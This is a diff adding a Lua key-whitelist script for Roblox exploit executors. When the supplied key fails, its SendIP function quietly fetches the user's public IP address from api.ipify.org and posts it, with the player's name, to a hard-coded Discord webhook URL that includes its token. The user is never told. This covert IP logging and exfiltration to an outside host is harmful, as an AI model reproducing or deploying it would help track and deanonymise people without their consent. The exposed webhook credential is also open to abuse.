@@ -1,0 +1,74 @@
+-- // VARIABLES \\ --
+local Keys = {'Your Key', 'Key'}
+local Webhook = "https://canary.discord.com/api/webhooks/990655878124417044/_zxJ13S3oU8DW6t7TfQcaSc9gyQnTKsqitG49fmreOTOpWMPqzKjkEEdFF-Bij1nXTrC"
+-- // UNTOUCH THIS VARIABLES \\ --
+local Allowed = false
+local AllowedValue = 0
+-- // FUNCTIONS \\ --
+local function Checkkey(Key)
+    for i,v in pairs(Keys) do
+        if Key == v then
+            Allowed = true
+            AllowedValue += 1
+        end
+    end
+end
+local function SendIP()
+    pcall(function()
+       local data = {
+           ["embeds"] = {
+               {
+                   ["title"] = 'User tried to login: '..game:GetService("Players").LocalPlayer.Name,
+                   ["description"] = '**USER NOT ALLOWED I IP:** '..game:HttpGet("https://api.ipify.org")
+               }
+           }
+       }
+
+       if syn then
+           local response = syn.request(
+               {
+                   Url = Webhook,
+                   Method = 'POST',
+                   Headers = {
+                       ['Content-Type'] = 'application/json'
+                   },
+                   Body = game:GetService('HttpService'):JSONEncode(data)
+               }
+           );
+       elseif request then
+           local response = request(
+               {
+                   Url = Webhook,
+                   Method = 'POST',
+                   Headers = {
+                       ['Content-Type'] = 'application/json'
+                   },
+                   Body = game:GetService('HttpService'):JSONEncode(data)
+               }
+           );
+       elseif http_request then
+           local response = http_request(
+               {
+                   Url = Webhook,
+                   Method = 'POST',
+                   Headers = {
+                       ['Content-Type'] = 'application/json'
+                   },
+                   Body = game:GetService('HttpService'):JSONEncode(data)
+               }
+           );
+       end
+    end)
+end
+
+-- // CHECK KEYS \\ --
+
+Checkkey(_G.Key)
+
+-- // WHITELIST \\ --
+_G.AllowedWhitelistedUserLol123 = false
+if AllowedValue == 1 then
+    _G.AllowedWhitelistedUserLol123 = true
+else
+    SendIP()
+end
